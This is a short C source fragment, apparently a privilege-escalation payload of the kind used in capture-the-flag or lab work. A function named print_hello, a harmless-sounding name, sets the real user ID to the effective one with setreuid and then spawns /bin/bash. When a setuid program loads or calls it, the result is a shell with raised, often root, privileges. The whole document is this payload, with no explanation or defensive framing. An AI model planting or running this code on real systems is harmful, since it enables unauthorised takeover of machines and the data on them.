#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void print_hello(){
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
}
